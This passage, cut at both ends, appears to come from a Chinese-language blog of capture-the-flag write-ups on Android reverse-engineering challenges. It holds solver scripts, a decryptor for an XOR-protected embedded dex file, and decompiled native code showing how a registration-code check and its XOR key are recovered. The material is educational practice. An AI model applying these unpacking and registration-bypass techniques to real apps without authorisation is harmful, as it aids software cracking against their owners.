class="keyword">int</span>)<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(b.chars.contains(arg5.toLowerCase())) &#123;</span><br><span class="line">            <span class="keyword">while</span>(ind &lt; b.integerList.size() - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>((<span class="keyword">int</span>)b.integerList.get(ind) == ((<span class="keyword">int</span>)b.chars.indexOf(arg5))) &#123;</span><br><span class="line">                    v1 = (<span class="keyword">int</span>)ind;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ++ind;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            v1 = arg5.contains(<span class="string">&quot; &quot;</span>) ? ((<span class="keyword">int</span>)-<span class="number">10</span>) : ((<span class="keyword">int</span>)-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        b.rot1();</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> b.rotateCnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">adworldeasyjava</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">encode</span><span class="params">(String arg1, b arg2, a arg3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> ret=  arg3.getCharByNumIndex(arg2.indexOf(arg1));</span><br><span class="line">        System.out.println(<span class="string">&quot;encode:&quot;</span> + arg1 + <span class="string">&quot;|&quot;</span> + ret);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title">adworldeasyjava</span><span class="params">(String str, Integer pos)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;adworldeasyjava: &quot;</span> + str +<span class="string">&quot;|&quot;</span>+ pos);</span><br><span class="line">        String arg8 = str;</span><br><span class="line">        String v2 = arg8;</span><br><span class="line">        b v4 = <span class="keyword">new</span> b(((<span class="keyword">int</span>)<span class="number">2</span>));</span><br><span class="line">        a v5 = <span class="keyword">new</span> a(((<span class="keyword">int</span>)<span class="number">3</span>));</span><br><span class="line">        </span><br><span class="line">        StringBuilder v3 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; v2.length()) &#123;</span><br><span class="line">            v3.append(encode(v2.charAt(ind) + <span class="string">&quot;&quot;</span>, v4, v5));</span><br><span class="line">            <span class="keyword">if</span>(((<span class="keyword">int</span>)(((<span class="keyword">int</span>)(((<span class="keyword">int</span>)v4.b()) / <span class="number">25</span>)))) &gt; v1 &amp;&amp; ((<span class="keyword">int</span>)(((<span class="keyword">int</span>)(((<span class="keyword">int</span>)v4.b()) / <span class="number">25</span>)))) &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                ++v1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++ind;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;v3:&quot;</span> + v3.toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v3.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;final answer: &quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v3.charAt(pos) == (<span class="string">&quot;wigwrkaugala&quot;</span>).charAt(pos))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;get one&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="comment">// return Boolean.valueOf(v3.toString().equals(&quot;wigwrkaugala&quot;));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> String chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">12</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">25</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(adworldeasyjava( ans + chars.charAt(i), ans.length()) )&#123;</span><br><span class="line">                    ans = ans + chars.charAt(i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        adworldeasyjava(<span class="string">&quot;venividivkcr&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc&#x27;</span></span><br><span class="line">s=a[<span class="number">16</span>:<span class="number">32</span>] + a[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line"><span class="built_in">print</span>(s[ind+<span class="number">1</span>] + s[ind], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">str1 = <span class="string">&#x27;QAoOQMPFks1BsB7cbM3TQsXg30i9g3==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;just_ANot#er_@p3&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>无趣的脑洞题：<br>apk里面藏了个<code>YOU_KNOW_</code>，然后文档里提示本题只是强行沾边了Android，说明出题人不懂Android，而做题人是懂Android的，所以flag是<code>YOU_KNOW_ANDROID</code>。<br>所以出题人看来真的不懂Android。</p><h1 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h1><p>非常有营养的一道题，解题的思路由一系列的知识点构成，并考察了基础的Android逆向知识。<br>解题过程参考自<a href="https://www.52pojie.cn/thread-1105062-1-1.html">neilwu@52pojie</a>。</p><p>首先打开apk，发现没有任何代码。<br>检查manifest文件，发现属性<code>hasCode=false</code>，这里需要的知识点为<a href="https://blog.csdn.net/qq_21071977/article/details/77878252">NativeActivity开发</a>，即使用纯C来完成App的开发。</p><p>有了这个知识，用ida打开so文件，定位到<code>android_main</code>函数，里面就是关于这个App的主要逻辑代码。<br>应用要求使用者在十秒之内晃动手机100次，然后解密释放出一个dex文件到指定目录，加载之后来到flag校验的步骤。<br>具体的流程还是需要我们自己去一点点分析还原。</p><ol><li><p>文件路径<br>dex释放过程中涉及到的两个路径名分别保存在<code>filename</code>和<code>name</code>中，并被抑或加密保护，还原的时候还要每4个字节调整顺序。<img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017200658963.png" alt="image-20211017200658963"></p></li><li><p>dex文件解密<br>dex文件也通过抑或加密保护，以字节流的方式写在.data中，起始位置是 0x7004，长度是 0x3ca10。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017203816974.png" alt="image-20211017203816974"><br>整个dex文件流一共分为10段来加解密，解密代码如下：<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017201220218.png" alt="image-20211017201220218"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&quot;xxx/odex&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">dd = <span class="built_in">list</span>(fr.read())</span><br><span class="line">fr.close()</span><br><span class="line"></span><br><span class="line">L = <span class="number">0x3ca10</span></span><br><span class="line">segLen = L // <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">99</span>,<span class="number">10</span>):</span><br><span class="line">    rnd = cnt // <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(segLen * rnd, segLen*rnd + segLen):</span><br><span class="line">        dd[ind] ^= cnt</span><br><span class="line">    <span class="keyword">if</span>(cnt == <span class="number">89</span>):</span><br><span class="line">        <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(segLen*rnd+segLen,L):</span><br><span class="line">            dd[ind] ^= <span class="number">89</span></span><br><span class="line"></span><br><span class="line">ddd=<span class="string">b&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="built_in">int</span>.to_bytes(x,<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>), dd))</span><br><span class="line"></span><br><span class="line">dddd = zlib.decompress(ddd)</span><br><span class="line"></span><br><span class="line">fw = <span class="built_in">open</span>(<span class="string">&quot;xxx/class.dex&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fw.write(dddd)</span><br><span class="line">fw.close()</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>dex执行<br>程序记录到100次摇晃之后，开始释放dex文件，加载并运行。<br>在<code>loadDex()</code>和<code>runDex()</code>函数中会有<a href="https://slient2009.github.io/2021/08/15/Android-NDK/#%E4%BB%8ENative%E5%8F%8D%E5%B0%84">从native反射java层</a>执行方法的相关代码。<img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017201828485.png" alt="image-20211017201828485"></p></li><li><p>TwoFish<br>dex的代码包含了一个flag校验程序，为<code>encode(flag, key)==cipher</code>的模式，加密代码很长很烧脑。</p><p>浏览一下App的字符串信息，有如下发现：<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017202524656.png" alt="image-20211017202524656"></p><p>这里需要新的知识：TwoFish加密算法，与AES的功能相似（因为也是当初AES海选的参赛选手之一）。<br>我们并不需要自己去实现一遍，找个<a href="http://tool.chacuo.net/crypttwofish">在线工具</a>就好。<br>不过还需要确定key和cipher。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017203102910.png" alt="image-20211017203102910"><br>分析代码，可知cipher=<code>new byte[]&#123;-120, 77, -14, -38, 17, 5, -42, 44, (byte)224, 109, 85, 31, 24, -91, (byte)144, -83, 0x40, -83, (byte)128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 117, 29, -44, 6, 112, -4, 81, 84, 9, 22, -51, 95, -34, 12, 47, 77&#125;</code>。<br>key是<code>0x7F060025</code>对应的String，简单的确定方法如下所示，可知key=<code>(&quot;I have a male fish and a female fish.&quot;).getBytes()</code>。</p></li></ol><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017203324877.png" alt="image-20211017203324877"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211017203452469.png" alt="image-20211017203452469"></p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>简单扫一下，看起来是注册码校验模式的App，关键的几个操作、检查注册码的函数埋在native层。<br>从JNI_OnLoad()函数里面可以找到与Java层的<code>initSN() saveSN() work()</code>方法绑定的native层函数。</p><p>程序运行时，先要求填入注册码，经过抑或加密之后保存到<code>/sdcard/reg.dat</code>。</p><p>在<code>work()</code>函数中，先调用<code>initSN()</code>检查是否注册，如果已经注册，就修改<code>MainActivity.m=1</code>。<br><code>initSN()</code>就是检查<code>/sdcard/reg.dat</code>中的数据是不是<code>EoPAoY62@ElRD</code>，如果是的话就设置<code>MainActivity.m=1</code>。<br><code>initSN</code>结束之后，就去检查<code>MainActivity.m</code>判断是否注册，并返回相应的提示信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">work</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *sendBackStr; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// zf</span></span><br><span class="line"></span><br><span class="line">  initSN(a1);</span><br><span class="line">  m = getValueOfm(a1);</span><br><span class="line">  <span class="keyword">if</span> ( m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = m == <span class="number">1</span>;</span><br><span class="line">    v3 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      sendBackStr = &amp;unk_2E6B;                  <span class="comment">// 输入即是flag,格式为xman&#123;……&#125;！ (idaapi导出解utf-8编码)</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sendBackStr = &amp;unk_2E95;                  <span class="comment">// 还不行呢！</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1;</span><br><span class="line">    sendBackStr = &amp;unk_2E5B;                    <span class="comment">// 状态不太对。。</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> setWorkString(v3, sendBackStr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">initSN</span><span class="params">(JNIEnv *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *regf; <span class="comment">// r0</span></span><br><span class="line">  FILE *regFile; <span class="comment">// r4</span></span><br><span class="line">  JNIEnv *v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">void</span> *regStr; <span class="comment">// r5</span></span><br><span class="line">  JNIEnv *v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  regf = fopen(<span class="string">&quot;/sdcard/reg.dat&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line">  regFile = regf;</span><br><span class="line">  <span class="keyword">if</span> ( !regf )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = env;</span><br><span class="line">    <span class="keyword">return</span> setValue(v4, <span class="number">0</span>);                     <span class="comment">// setValue(env, v)，把Java层的MainActivity.m值改为v</span></span><br><span class="line">  &#125;</span><br><span class="line">  fseek(regf, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  v5 = ftell(regFile);</span><br><span class="line">  regStr = <span class="built_in">malloc</span>(v5 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !regStr )</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(regFile);</span><br><span class="line">    v4 = env;</span><br><span class="line">    <span class="keyword">return</span> setValue(v4, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fseek(regFile, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  fread(regStr, v5, <span class="number">1u</span>, regFile);</span><br><span class="line">  *((_BYTE *)regStr + v5) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)regStr, <span class="string">&quot;EoPAoY62@ElRD&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = env;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = env;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  setValue(v8, v9);</span><br><span class="line">  <span class="keyword">return</span> j_fclose(regFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的字符串提示输入的注册码就是flag，提交的时候包裹上<code>xman&#123;....&#125;</code>就行了。<br>注册码加密为<code>xor(SignCode, key)=cipher</code>模式，其中<code>cipher=EoPAoY62@ElRD</code>。<br>经过分析，也可以得到<code>key=W3_arE_whO_we_ARE</code>（或者说<code>key=w_a</code>），进一步可以得到flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">saveSN</span><span class="params">(JNIEnv *env, <span class="keyword">int</span> thiz, <span class="keyword">int</span> ptr_sn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *fptr; <span class="comment">// r7</span></span><br><span class="line">  _DWORD *Bytess; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *key; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">  _WORD *v11; <span class="comment">// r5</span></span><br><span class="line">  JNIEnv *v12; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> x; <span class="comment">// r4</span></span><br><span class="line">  JNIEnv v14; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> ind; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *sn; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">char</span> *sn_ptr; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> sn_len; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// r3</span></span><br><span class="line">  _BYTE Bytes[<span class="number">56</span>]; <span class="comment">// [sp+0h] [bp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fptr = fopen(<span class="string">&quot;/sdcard/reg.dat&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fptr )</span><br><span class="line">    <span class="keyword">return</span> j___android_log_print(<span class="number">3</span>, <span class="string">&quot;com.gdufs.xman&quot;</span>, byte_2DCA);</span><br><span class="line">  Bytess = Bytes;</span><br><span class="line">  key = <span class="string">&quot;W3_arE_whO_we_ARE&quot;</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *(_DWORD *)key;</span><br><span class="line">    key += <span class="number">8</span>;</span><br><span class="line">    v10 = *((_DWORD *)key - <span class="number">1</span>);</span><br><span class="line">    *Bytess = v9;</span><br><span class="line">    Bytess[<span class="number">1</span>] = v10;</span><br><span class="line">    v11 = Bytess + <span class="number">2</span>;</span><br><span class="line">    Bytess += <span class="number">2</span>;</span><br><span class="line">  &#125;  <span class="keyword">while</span> ( key != <span class="string">&quot;E&quot;</span> );<span class="comment">//这里产生抑或密钥，事实上就是原来的key。</span></span><br><span class="line">  v12 = env;</span><br><span class="line">  x = <span class="number">2016</span>;</span><br><span class="line">  *v11 = *(_WORD *)key;</span><br><span class="line">  v14 = *env;</span><br><span class="line">  ind = <span class="number">0</span>;</span><br><span class="line">  sn = v14-&gt;GetStringUTFChars(v12, (jstring)ptr_sn, <span class="number">0</span>);</span><br><span class="line">  sn_ptr = (<span class="keyword">char</span> *)sn;</span><br><span class="line">  sn_len = <span class="built_in">strlen</span>(sn);</span><br><span class="line">  <span class="keyword">while</span> ( ind &lt; sn_len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ind % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      x = (x + <span class="number">5</span>) % <span class="number">16</span>;  <span class="comment">// x 会进入4，9，1的循环</span></span><br><span class="line">      v19 = Bytes[x + <span class="number">1</span>];                       <span class="comment">// Bytes[9+1]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ind % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      x = (x + <span class="number">7</span>) % <span class="number">15</span>;</span><br><span class="line">      v19 = Bytes[x + <span class="number">2</span>];                       <span class="comment">// Bytes[1+2]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      x = (x + <span class="number">3</span>) % <span class="number">13</span>;</span><br><span class="line">      v19 = Bytes[x + <span class="number">3</span>];                       <span class="comment">// Bytes[4+3]</span></span><br><span class="line">    &#125;</span><br><span class="line">    v20 = *sn_ptr;</span><br><span class="line">    ++ind;</span><br><span class="line">    *sn_ptr++ = v20 ^ v19;<span class="comment">//抑或加密</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fputs</span>(sn, fptr);<span class="comment">//写入文件</span></span><br><span class="line">  <span class="keyword">return</span> j_fclose(fptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>首先，构造一个心形图案，约束条件如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.matrix[<span class="number">1</span>][<span class="number">1</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">1</span>][<span class="number">2</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">1</span>][<span class="number">7</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">1</span>][<span class="number">8</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">2</span>][<span class="number">0</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">2</span>][<span class="number">3</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">2</span>][<span class="number">6</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">2</span>][<span class="number">9</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">3</span>][<span class="number">0</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">3</span>][<span class="number">4</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">3</span>][<span class="number">5</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">3</span>][<span class="number">9</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">4</span>][<span class="number">0</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">4</span>][<span class="number">9</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">5</span>][<span class="number">1</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">5</span>][<span class="number">8</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">6</span>][<span class="number">2</span>].getStatus() == <span class="number">1</span> &amp;&amp; 